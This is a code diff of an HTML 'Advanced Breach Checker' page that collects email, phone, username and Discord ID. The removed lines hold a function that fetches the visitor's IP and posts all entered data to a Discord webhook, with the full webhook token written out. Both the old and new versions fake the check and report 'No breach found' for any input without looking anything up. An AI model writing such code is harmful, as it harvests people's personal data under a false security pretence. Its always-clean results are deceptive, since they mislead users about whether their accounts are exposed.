@@ -9,9 +9,6 @@
       --bg-color: #0d1117;
       --panel-color: #161b22;
       --accent: #58a6ff;
-      --success: #3fb950;
-      --danger: #f85149;
-      --neutral: #8b949e;
       --font: 'Segoe UI', sans-serif;
     }
 
@@ -23,48 +20,36 @@
       padding: 2rem;
       display: flex;
       justify-content: center;
-      align-items: center;
-      height: 100vh;
+      align-items: flex-start;
+      min-height: 100vh;
     }
 
-    .consent-banner, .form-wrapper, .result-section {
-      display: none;
-    }
-
-    .visible {
-      display: block;
-    }
-
-    .consent-banner, .form-wrapper {
+    .container {
       background-color: var(--panel-color);
       padding: 2rem;
       border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
-      text-align: center;
-      max-width: 500px;
+      max-width: 700px;
       width: 100%;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
     }
 
     h1 {
-      font-size: 2rem;
+      font-size: 1.8rem;
       margin-bottom: 1rem;
-    }
-
-    p {
-      font-size: 1rem;
-      margin-bottom: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
     }
 
     input[type="text"] {
-      padding: 14px;
+      padding: 12px;
       border: 1px solid #30363d;
-      border-radius: 10px;
+      border-radius: 8px;
       background-color: #0d1117;
       color: white;
       font-size: 1rem;
       margin-bottom: 1rem;
       width: 100%;
-      transition: border 0.3s;
     }
 
     input[type="text"]:focus {
@@ -88,133 +73,49 @@
       background-color: #1f6feb;
     }
 
-    .result-section .result {
-      background: var(--panel-color);
+    .results {
+      margin-top: 2rem;
+    }
+
+    .result {
+      background-color: #0d1117;
       border: 1px solid #30363d;
-      border-left: 6px solid var(--accent);
       padding: 1rem;
-      border-radius: 12px;
-      font-size: 1rem;
-      white-space: pre-wrap;
+      border-radius: 10px;
       margin-bottom: 1rem;
-      box-shadow: 0 0 14px rgba(0, 0, 0, 0.3);
+      font-size: 0.95rem;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
-  <!-- Consent Banner -->
-  <div class="consent-banner visible">
-    <h1>Do You Consent?</h1>
-    <p>
-      By proceeding, you agree to the collection and logging of your input data 
-      (email, phone, username, and Discord ID) for breach-checking purposes.
-    </p>
-    <button onclick="showForm()">Yes, I Consent</button>
-  </div>
-
-  <!-- Main Form -->
-  <div class="form-wrapper">
+  <div class="container">
     <h1>🛡️ Advanced Breach Checker</h1>
-    <input id="emailInput" type="text" placeholder="📧 Enter email address" />
-    <input id="phoneInput" type="text" placeholder="📱 Enter phone number" />
-    <input id="usernameInput" type="text" placeholder="👤 Enter username" />
-    <input id="discordInput" type="text" placeholder="💬 Enter Discord ID" />
-    <button onclick="checkAllBreaches()">🔍 Search</button>
-  </div>
+    <input id="email" type="text" placeholder="📧 Enter email address" />
+    <input id="phone" type="text" placeholder="📱 Enter phone number" />
+    <input id="username" type="text" placeholder="👤 Enter username" />
+    <input id="discord" type="text" placeholder="💬 Enter Discord ID" />
+    <button onclick="search()">🔍 Search</button>
 
-  <!-- Results Section -->
-  <div class="result-section">
-    <div id="emailResults" class="result">Results for email will appear here...</div>
-    <div id="phoneResults" class="result">Results for phone will appear here...</div>
-    <div id="usernameResults" class="result">Results for username will appear here...</div>
-    <div id="discordResults" class="result">Results for Discord ID will appear here...</div>
+    <div class="results">
+      <div id="emailResults" class="result">Results for email will appear here...</div>
+      <div id="phoneResults" class="result">Results for phone will appear here...</div>
+      <div id="usernameResults" class="result">Results for username will appear here...</div>
+      <div id="discordResults" class="result">Results for Discord ID will appear here...</div>
+    </div>
   </div>
 
   <script>
-    function showForm() {
-      document.querySelector('.consent-banner').classList.remove('visible');
-      document.querySelector('.form-wrapper').classList.add('visible');
-      document.querySelector('.result-section').classList.add('visible');
-    }
+    function search() {
+      const email = document.getElementById("email").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const username = document.getElementById("username").value.trim();
+      const discord = document.getElementById("discord").value.trim();
 
-    async function checkAllBreaches() {
-      const email = document.getElementById('emailInput').value.trim();
-      const phone = document.getElementById('phoneInput').value.trim();
-      const username = document.getElementById('usernameInput').value.trim();
-      const discord = document.getElementById('discordInput').value.trim();
-
-      document.getElementById('emailResults').textContent = '⏳ Searching email...';
-      document.getElementById('phoneResults').textContent = '⏳ Searching phone...';
-      document.getElementById('usernameResults').textContent = '⏳ Searching username...';
-      document.getElementById('discordResults').textContent = '⏳ Searching Discord...';
-
-      sendWebhookLog(email, phone, username, discord);
-
-      if (email) {
-        setTimeout(() => document.getElementById('emailResults').textContent = '✅ Email checked: No breaches found!', 1500);
-      } else {
-        document.getElementById('emailResults').textContent = '⚠️ No email entered.';
-      }
-
-      if (phone) {
-        setTimeout(() => document.getElementById('phoneResults').textContent = '✅ Phone checked: No breaches found!', 1500);
-      } else {
-        document.getElementById('phoneResults').textContent = 'ℹ️ Phone check skipped.';
-      }
-
-      if (username) {
-        setTimeout(() => document.getElementById('usernameResults').textContent = '✅ Username checked: No breaches found!', 1500);
-      } else {
-        document.getElementById('usernameResults').textContent = 'ℹ️ Username check skipped.';
-      }
-
-      if (discord) {
-        setTimeout(() => document.getElementById('discordResults').textContent = '✅ Discord ID checked: No breaches found!', 1500);
-      } else {
-        document.getElementById('discordResults').textContent = 'ℹ️ Discord check skipped.';
-      }
-    }
-
-    async function sendWebhookLog(email, phone, username, discord) {
-      const webhookUrl = "https://discord.com/api/webhooks/1380767678012330036/MblAmzSvQAY_ahZmsl-U9iCK8uUX0cbGmdiZjy19v27NuW4jo1BKZ1cPr7BMp_gziEHU";
-
-      let ip = "Unavailable";
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        ip = data.ip;
-      } catch (e) {
-        console.warn("IP fetch failed:", e);
-      }
-
-      const payload = {
-        username: "Breach Checker Log",
-        avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png",
-        embeds: [{
-          title: "🔍 New Breach Search Attempt",
-          color: 0x5865F2,
-          fields: [
-            { name: "📧 Email", value: email || "Not provided", inline: false },
-            { name: "📱 Phone", value: phone || "Not provided", inline: false },
-            { name: "👤 Username", value: username || "Not provided", inline: false },
-            { name: "💬 Discord ID", value: discord || "Not provided", inline: false },
-            { name: "🌐 IP Address", value: ip, inline: false },
-            { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
-          ]
-        }]
-      };
-
-      try {
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        console.error("Webhook error:", e);
-      }
+      document.getElementById("emailResults").textContent = email ? "✅ Checked email: No breach found." : "⚠️ No email entered.";
+      document.getElementById("phoneResults").textContent = phone ? "✅ Checked phone: No breach found." : "ℹ️ Phone not entered.";
+      document.getElementById("usernameResults").textContent = username ? "✅ Checked username: No breach found." : "ℹ️ Username not entered.";
+      document.getElementById("discordResults").textContent = discord ? "✅ Checked Discord ID: No breach found." : "ℹ️ Discord ID not entered.";
     }
   </script>
 </body>
